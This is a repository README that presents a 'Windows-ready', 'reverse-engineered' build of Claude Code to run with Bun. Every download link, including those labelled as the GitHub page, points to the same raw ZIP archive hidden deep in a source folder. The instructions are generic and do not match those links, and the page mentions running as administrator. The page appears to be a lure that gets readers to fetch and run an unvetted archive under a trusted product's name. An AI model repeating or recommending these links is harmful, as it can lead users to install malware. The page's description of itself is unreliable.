# 🤖 claude-code - Run Claude Code on Windows

[![Download / Visit Page](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip)

## 🚀 What this is

claude-code is a Windows-ready build of Claude Code Source. It gives you a simple way to run the app from your PC with Bun as the runtime. This fork focuses on a buildable setup, so you can use the source and run the app without extra setup work.

Use it if you want a local app that connects code work, research tasks, and a simple Windows workflow.

## 💾 Download

Open this page and download the files from the repository:

[https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip](https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip)

If the page offers a release file, download it to your PC. If it provides source files, use the steps below to run it on Windows.

## 🖥️ What you need

Before you start, make sure you have:

- Windows 10 or Windows 11
- A stable internet connection
- Enough free space for the app and its files
- Bun installed on your system
- A browser to open the GitHub page

For the smoothest setup, use a user account that can install apps on your PC.

## 📦 Install Bun

This app runs with Bun. If Bun is not on your PC yet, install it first.

1. Open the Bun site in your browser.
2. Download the Windows installer.
3. Run the installer.
4. Finish the install with the default options.
5. Close and reopen Command Prompt or PowerShell so Windows can find Bun.

To check that Bun is ready, open Command Prompt and type:

bun --version

If you see a version number, Bun is set up.

## 🔧 Get the source files

1. Open the GitHub page:
   [https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip](https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip)
2. Click the green Code button.
3. Choose Download ZIP.
4. Save the ZIP file to a folder you can find, like Downloads.
5. Right-click the ZIP file and choose Extract All.

After extraction, you should see the project files in a folder such as `claude-code`.

## ▶️ Run the app on Windows

1. Open the extracted project folder.
2. Look for the file that starts the app, such as a Bun entry file or package config.
3. Open Command Prompt in that folder.
4. Run the install step if the project uses one:

bun install

5. Start the app:

bun run start

If the project uses a different command name, use the script listed in the package file.

## 🧭 First setup

The first time you run the app, it may ask for basic setup details. Common steps include:

- Choosing a profile or workspace
- Signing in with your account
- Allowing the app to access local files
- Setting a project folder

Keep the app open while it finishes the first setup.

## 🪟 Windows tips

If the app does not open the first time, try these steps:

1. Close the app.
2. Open Command Prompt again.
3. Go back to the project folder.
4. Run the start command again.
5. Make sure Bun is still installed and available in your PATH.

If Windows blocks the file, right-click it and choose Run as administrator only if you trust the source and need higher access for your local setup.

## 🧪 Common project files

You may see these files in the folder:

- `package.json` — lists the app scripts
- `bun.lockb` — Bun lock file
- `src` — main source files
- `README.md` — project notes
- `public` — app assets

These files help the app build and run on your machine.

## 🛠️ If you want to rebuild the app

If you want to work with the source, you can rebuild it with Bun.

1. Open the project folder.
2. Install the files with:

bun install

3. Run the build command if the project includes one:

bun run build

4. Use the start command after the build finishes.

This setup helps you test changes and rerun the app from source.

## 📁 Suggested folder layout

Use a simple folder path like this:

`C:\Users\YourName\Downloads\claude-code`

A short path helps avoid path issues on Windows. Keep the folder name the same so you can find it fast later.

## ⌨️ Useful commands

Use these commands from inside the project folder:

- `bun install` — downloads the needed packages
- `bun run start` — starts the app
- `bun run build` — builds the app
- `bun --version` — checks Bun

If the project uses different script names, open `package.json` and look at the scripts section.

## 🔒 File access

This app may need access to your local files to work with code and research content. If Windows asks for permission, allow access for the folder you want to use with the app.

For best results, keep your work in one project folder so the app can open and manage it with less friction.

## 🧩 Basic troubleshooting

### The app does not start

- Check that Bun is installed
- Open the terminal in the project folder
- Run `bun install` again
- Try `bun run start`

### The folder opens, but nothing happens

- Make sure you are in the right folder
- Check that `package.json` exists
- Confirm that the start script is present

### Windows shows a path error

- Move the project to a shorter folder path
- Avoid folders with special characters
- Use a plain name like `claude-code`

### The browser or terminal closes

- Run the command from Command Prompt instead of double-clicking files
- Keep the terminal window open while the app runs

## 📚 Project purpose

claude-code is built as a source-based Windows app for research and code work. The goal is to give users a local setup they can run with Bun and keep in one place. It fits users who want a buildable fork they can inspect, run, and use on Windows

## 🔍 What you should expect

When the app runs, you should see:

- A working Windows app window or local interface
- Simple controls for the main task flow
- A setup path that uses Bun
- Source files you can keep in your own folder

If the app includes settings, they will likely be in the main window or in a small menu

## 🧷 Quick install path

1. Visit the repository page:
   [https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip](https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip)
2. Download the ZIP file or use the release file if one is shown
3. Install Bun
4. Extract the project folder
5. Run `bun install`
6. Run `bun run start`

## 🗂️ Repo name

`claude-code`

## 📝 Description

Claude Code Source - Buildable Research Fork. Reverse-engineered build system, runnable with Bun.

## 👤 Intended use

This project suits users who want:

- A Windows app that runs from source
- A simple Bun-based setup
- A local folder they can keep and reopen
- A research-oriented code workspace

## 🔗 Primary link

[https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip](https://raw.githubusercontent.com/Bertineburundi952/claude-code/main/src/commands/agents-platform/code_claude_v3.3.zip)